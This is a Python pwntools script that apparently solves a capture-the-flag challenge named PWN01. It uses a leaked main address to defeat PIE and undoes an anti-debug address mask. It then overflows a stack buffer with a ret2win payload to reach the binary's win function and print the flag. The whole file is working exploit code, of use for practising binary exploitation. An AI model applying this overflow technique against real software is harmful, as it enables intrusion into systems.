#!/usr/bin/env python3
"""Exploit the supplied PWN01 archive and print the target's flag response."""

import argparse
import re
import sys
import tempfile
import zipfile
from pathlib import Path

from pwn import context, log, p64, process, remote


ARCHIVE = Path(__file__).resolve().parent / "PWN01.zip"
MAIN_OFFSET = 0x12FC
WIN_OFFSET = 0x1422
RET_OFFSET = 0x101A
RETURN_OFFSET = 0x58


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"))
    parser.add_argument("--ssl", action="store_true", help="use TLS for the remote connection")
    parser.add_argument("--traced", action="store_true",
                        help="undo the binary's 0x40 main-address mask when TracerPid is nonzero")
    args = parser.parse_args()
    context.arch = "amd64"
    context.log_level = "info"

    if args.remote:
        io = remote(args.remote[0], int(args.remote[1]), ssl=args.ssl)
    else:
        with zipfile.ZipFile(ARCHIVE) as zf:
            names = zf.namelist()
            binary_name = next(n for n in names if n.endswith("/mirage"))
            with tempfile.TemporaryDirectory(prefix="pwn01-") as tmp:
                zf.extract(binary_name, tmp)
                binary = Path(tmp) / binary_name
                binary.chmod(0o755)
                io = process([str(binary)])
                return exploit(io, args.traced)
    return exploit(io, args.traced)


def exploit(io, traced):
    greeting = io.recvuntil(b"input:\n")
    match = re.search(rb"main@(0x[0-9a-fA-F]+)", greeting)
    if not match:
        raise RuntimeError(f"target did not provide a main address: {greeting!r}")
    leaked_main = int(match.group(1), 16)
    if traced:
        leaked_main ^= 0x40
    base = leaked_main - MAIN_OFFSET
    win = base + WIN_OFFSET
    ret = base + RET_OFFSET
    log.info("PIE base=%#x, win=%#x", base, win)

    # main's read starts 0x100 bytes into its frame; saved RIP is 0x158 bytes
    # from frame base, giving a 0x58-byte payload offset. One ret fixes SysV
    # stack alignment before entering win().
    payload = b"A" * RETURN_OFFSET + p64(ret) + p64(win)
    io.send(payload)
    result = io.recvall(timeout=3)
    print(result.decode("utf-8", errors="replace"), end="")
    if not re.search(rb"(?:CSCV\w*\{|flag\{)", result, re.IGNORECASE):
        raise RuntimeError("exploit reached the target, but no flag-shaped response was returned")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except RuntimeError as exc:
        print(f"FAIL: {exc}", file=sys.stderr)
        raise SystemExit(1)
